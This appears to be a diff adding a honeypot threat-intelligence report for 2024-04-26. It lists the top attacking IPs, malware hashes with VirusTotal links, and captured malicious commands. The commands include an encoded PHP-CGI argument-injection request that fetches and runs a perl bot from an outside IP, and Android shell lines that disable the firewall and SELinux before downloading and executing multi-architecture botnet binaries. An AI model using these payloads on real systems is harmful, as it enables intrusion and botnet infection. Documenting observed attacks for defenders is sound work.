@@ -1,0 +1,30 @@
+Top 5 IPs for 2024-04-26 :
+
+162.240.149.176
+77.239.213.223
+104.248.33.63
+188.171.35.7
+111.67.199.209
+
+Malware Download:
+
+
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+https://www.virustotal.com/gui/file/77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+Malicious Commands seen:
+
+POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
+Host: -c
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+
+<? system("cd /tmp ; wget http://91.121.47.45/bo;perl bo;rm -rf bo;history -c;clear "); ?>
+
+
+
+pkill -f M\npkill -f arm7\npkill -f arm\npkill -f x86\npkill -f x86_64\nsu 0 pkill -f M\nsu 0 pkill -f arm7\nsu 0 pkill -f arm\nsu 0 pkill -f x86\nsu 0 pkill -f x86_64\nsu 0 iptables -F\nsu 0 setenforce 0\nsu 0 busybox wget http://14.225.218.2/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a\nbusybox wget http://14.225.218.2/a; chmod 777 a;sh a\nbusybox wget http://14.225.218.2/most-arm; chmod 777 most-arm; ./most-arm android.exploit\nbusybox wget http://14.225.218.2/most-arm5; chmod 777 most-arm5; ./most-arm5 android.exploit\nbusybox wget http://14.225.218.2/most-arm6; chmod 777 most-arm6; ./most-arm6 android.exploit\nbusybox wget http://14.225.218.2/most-arm7; chmod 777 most-arm7; ./most-arm7 android.exploit\nbusybox wget http://14.225.218.2/most-m68k; chmod 777 most-m68k; ./most-m68k android.exploit\nbusybox wget http://14.225.218.2/most-mips; chmod 777 most-mips; ./most-mips android.exploit\nbusybox wget http://14.225.218.2/most-mpsl; chmod 777 most-mpsl; ./most-mpsl android.exploit\nbusybox wget http://14.225.218.2/most-ppc; chmod 777 most-ppc; ./most-ppc android.exploit\nbusybox wget http://14.225.218.2/most-sh4; chmod 777 most-sh4; ./most-sh4 androi
